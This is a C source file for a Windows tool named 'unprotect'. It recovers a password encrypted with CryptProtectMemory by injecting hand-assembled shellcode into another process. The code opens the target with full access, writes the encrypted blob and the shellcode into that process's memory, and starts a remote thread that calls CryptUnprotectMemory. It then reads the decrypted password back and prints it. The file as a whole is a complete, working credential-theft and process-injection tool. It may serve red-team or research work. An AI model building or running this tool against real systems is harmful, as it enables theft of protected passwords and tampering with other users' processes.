#include "unprotect.h"

void usage() {
    printf("Usage: .\\unprotect.exe PROCESS_PID PASSWORD_HEX\n");
    printf("Example: .\\unprotect.exe 5820 eece029075166d89496439c46c125b14bcc571884a1370c834d742c79fac2c4f\n");
    exit(1);
}

int main(int argc, char* argv[])
{   
    DWORD dwProcessId;
    char* blob_enc;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    LPVOID lpBuffer = NULL;
    SIZE_T lpnumber = 0;

    dwProcessId = 5820;
    blob_enc = "eece029075166d89496439c46c125b14bcc571884a1370c834d742c79fac2c4f";

#if !defined DEBUG
    if (argc < 3) {
        usage();
    }
    // Process PID
    dwProcessId = atoi(argv[1]);
    // Password encrypted with CryptProtectMemory
    blob_enc = argv[2];
#endif 

    // Shellcode
    int shellcode_size = 141;
    UCHAR shellcode[] = {
        0x48, 0xb9, PROTECTED_BLOB_ADDR, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS RCX, <ADDR>
        0x48, 0xba, PROTECTED_BLOB_SIZE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS RDX, <ADDR>
        0x49, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS R8, <ADDR>
        0x48, 0xb8, UNPROTECTMEMORY_ADDR, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS RAX, <ADDR>
        0xff, 0xd0, //CALL RAX

        0x48, 0xb9, RESULT_CAVE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS RCX, <ADDR>
        0x48, 0xba, PROTECTED_BLOB_ADDR, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS RDX, <ADDR>
        0x49, 0xb8, PROTECTED_BLOB_SIZE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS R8, <ADDR>
        0x48, 0xb8, COPYMEMORY_ADDR, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS RAX, <ADDR>
        0xff, 0xd0, //CALL RAX

        0x48, 0xb9, PROTECTED_BLOB_ADDR, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS RCX, <ADDR>
        0x48, 0xba, PROTECTED_BLOB_SIZE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS RDX, <ADDR>
        0x49, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS R8, <ADDR>
        0x48, 0xb8, PROTECTMEMORY_ADDR, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS RAX, <ADDR>
        0xff, 0xd0, //CALL RAX

        0x48, 0x89, 0xC1, //mov rcx, rax
        0x48, 0xb8, EXITTHREAD_ADDR, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //MOVABS RAX, <ADDR>
        0xff, 0xd0 //CALL RAX
    };

    // Open process (with all access)
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (!hProcess) {
        printf("Failed to open the target process");
        return 1;
    }

    // Get remote function addresses
    long long protectmemory_addr = get_remote_function_addr(hProcess, "Crypt32.dll", "CryptProtectMemory");
    long long unprotectmemory_addr = get_remote_function_addr(hProcess, "Crypt32.dll", "CryptUnprotectMemory");
    long long exitthread_addr = get_remote_function_addr(hProcess, "Kernel32.dll", "ExitThread");
    long long copymemory_addr = get_remote_function_addr(hProcess, "NtDll.dll", "RtlCopyMemory");

    //printf("protectmemory_addr: 0x%llx\n", protectmemory_addr);
    //printf("unprotectmemory_addr: 0x%llx\n", unprotectmemory_addr);
    //printf("exitthread_addr: 0x%llx\n", exitthread_addr);
    //printf("copymemory_addr: 0x%llx\n", copymemory_addr);

    if (protectmemory_addr == 0 || unprotectmemory_addr == 0 || exitthread_addr == 0 || copymemory_addr == 0) {
        return 1;
    }

    // Set encrypted password (in target process)
    size_t nb_uchar_blob = strlen(blob_enc) / 2;
    UCHAR* blob_enc_hex = malloc(nb_uchar_blob * sizeof(UCHAR));

    for (size_t count = 0; count < nb_uchar_blob; count++) {
        sscanf_s(blob_enc, "%2hhx", &blob_enc_hex[count]);
        blob_enc += 2;
    }

    LPVOID encBlobAddr = VirtualAllocEx(hProcess, NULL, nb_uchar_blob, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (WriteProcessMemory(hProcess, encBlobAddr, blob_enc_hex, 32, &lpnumber) == 0) {
        printf("Failed to write in memory!");
        return 1;
    }
    
    // Encrypted password address
    long long protected_blob_addr = (long long)encBlobAddr;
    long long protected_blob_size = (long long)nb_uchar_blob;

    //printf("protected_blob_addr: 0x%llx\n", protected_blob_addr);
    
    // Allocate memory space (in target process)
    LPVOID code_cave = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID result_cave = VirtualAllocEx(hProcess, NULL, protected_blob_size*10, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Construct shellcode
    insert_addr_shellcode(protectmemory_addr, sizeof(DWORD_PTR), shellcode, shellcode_size, PROTECTMEMORY_ADDR);
    insert_addr_shellcode(unprotectmemory_addr, sizeof(DWORD_PTR), shellcode, shellcode_size, UNPROTECTMEMORY_ADDR);
    insert_addr_shellcode(exitthread_addr, sizeof(DWORD_PTR), shellcode, shellcode_size, EXITTHREAD_ADDR);
    insert_addr_shellcode(copymemory_addr, sizeof(DWORD_PTR), shellcode, shellcode_size, COPYMEMORY_ADDR);
    insert_addr_shellcode((long long)result_cave, sizeof(DWORD_PTR), shellcode, shellcode_size, RESULT_CAVE);
    insert_addr_shellcode(protected_blob_addr, sizeof(DWORD_PTR), shellcode, shellcode_size, PROTECTED_BLOB_ADDR);
    insert_addr_shellcode(protected_blob_size, sizeof(DWORD_PTR), shellcode, shellcode_size,PROTECTED_BLOB_SIZE);

    //printf("Size shellcode: %d\n", sizeof(shellcode));
    //for (size_t i = 0; i < 141; ++i) {
    //    printf("%x ", shellcode[i]);
    //}
    
    // Write shellcode
    if (WriteProcessMemory(hProcess, code_cave, shellcode, shellcode_size, &lpnumber) == 0) {
        printf("Failed to write in memory!");
        return 1;
    }

    // Execute shellcode
    HANDLE hshellcode = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)code_cave, NULL, 0, 0);
    if (hshellcode == NULL) {
        printf("Failed to execute shellcode");
        return 1;
    }
    DWORD dwRet = WaitForSingleObject(hshellcode, 200);

    //if (GetExitCodeThread(hshellcode, &lpExitCode) == 0) {
    //    printf("GetExitCodeThread failed");
    //    return 1;
    //}

    // Get decrypted password
    char* clearPassword = malloc(protected_blob_size * (sizeof(char)));
    if (ReadProcessMemory(hProcess, result_cave, clearPassword, (SIZE_T)protected_blob_size, NULL) == 0) {
        printf("Process memory reading failed");
        return 1; 
    }
    
    size_t start = 0;
    if ((int)clearPassword[0] == 0) {
        start = sizeof(DWORD);
    }

    for (size_t i = start; i < (size_t)protected_blob_size; i++) {
        if ((int)clearPassword[i] != 0) {
            printf("%c", clearPassword[i]);
        }
    }
    printf("\n");
    
    // Free
    free(clearPassword);
    free(blob_enc_hex);
    if (VirtualFreeEx(hProcess, code_cave, 0, MEM_RELEASE) == 0 || 
        VirtualFreeEx(hProcess, result_cave, 0, MEM_RELEASE) == 0 ||
        VirtualFreeEx(hProcess, encBlobAddr, 0, MEM_RELEASE) == 0){
        printf("VirtualFreeEx failed");
        return 1;
    }
    
    CloseHandle(hProcess);
    
	return 0;
}

// Get remote address function
long long get_remote_function_addr(HANDLE hProcess, char* dll_name, char* function_name) {
    MODULEINFO mi, miRemote;
    HMODULE hMods[1024];
    char dllNameBuf[1024];
    DWORD cbNeeded;
    unsigned int i;
    strcpy_s(dllNameBuf, sizeof dllNameBuf, dll_name);

    // Load DLL
    HMODULE hModule = LoadLibraryA(dll_name);
    if (hModule == NULL) {
        printf("Error while loading %s", dll_name);
        return 1;
    }

    // Get function address in DLL
    FARPROC function_addr_total = GetProcAddress(hModule, function_name);
    if (function_addr_total == NULL) {
        printf("Error while getting %s address", function_name);
        return 1;
    }
    //printf("[+] function_addr_total address is: 0x%llx\n", (long long)function_addr_total);

    // Get address offset
    int ret = GetModuleInformation(GetCurrentProcess(), hModule, &mi, sizeof(mi));
    if (ret == 0) {
        printf("Error while getting module information");
        return 1;
    }
    long long function_addr_offset = (long long)mi.lpBaseOfDll - (long long)function_addr_total;
    //printf("[+] function_addr_offset address is: 0x%llx\n", function_addr_offset);
    
    // Enum remote process modules
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    { 
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            // Get module name
            char szModName[MAX_PATH]; char* PszModName = szModName;
            if (GetModuleFileNameExA(hProcess, hMods[i], PszModName, sizeof(szModName) / sizeof(char))) {
                lowercase(szModName);
                lowercase(dllNameBuf);

                if (strstr(szModName, dllNameBuf) != NULL) {
                    if (GetModuleInformation(hProcess, hMods[i], &miRemote, sizeof(miRemote)) == 0) {
                        printf("Error while getting module info of %s", szModName);
                        return 1;
                    }
                    // Get function address in the remote process
                    long long remote_function_addr = (long long)miRemote.lpBaseOfDll - (long long)function_addr_offset;
                    //printf("[+] Remote %s address is: 0x%llx\n\n", function_name, remote_function_addr);
                    return remote_function_addr;
                }
            }
        }
    }

    printf("Function %s address not found!\n", function_name);
    return 0;
}

// Insert an address into shellcode
void insert_addr_shellcode(long long addr, size_t saddr, UCHAR* shellcode, size_t shellcode_size, int marker) {
    DWORD offset = getOffset(shellcode, marker, shellcode_size);
    while (offset != 0) {
        for (size_t i = 0; i < saddr; i++) {
            shellcode[offset + i] = ((long long)addr >> 8 * i) & 0xff;
        }
        offset = getOffset(shellcode, marker, shellcode_size);
    }
}

// Get an address offset
DWORD getOffset(UCHAR* shellcode, int marker, size_t len) {
    for (DWORD i = 0; i < len; i++) {
        if (marker == shellcode[i]) {
            int cpt = 0;
            for (DWORD j = 1; j < 8; j++) {
                if (i + j < len && shellcode[i + j] == 0) {
                    cpt++;
                }
            }

            if (cpt == 7) {
                return i;
            }

        }
    }

    return 0;
}

// Lowercase a string
void lowercase(char* str) {
    size_t len = strlen(str);
    for (size_t i = 0; i < len; ++i) {
        str[i] = tolower(str[i]);
    }
}

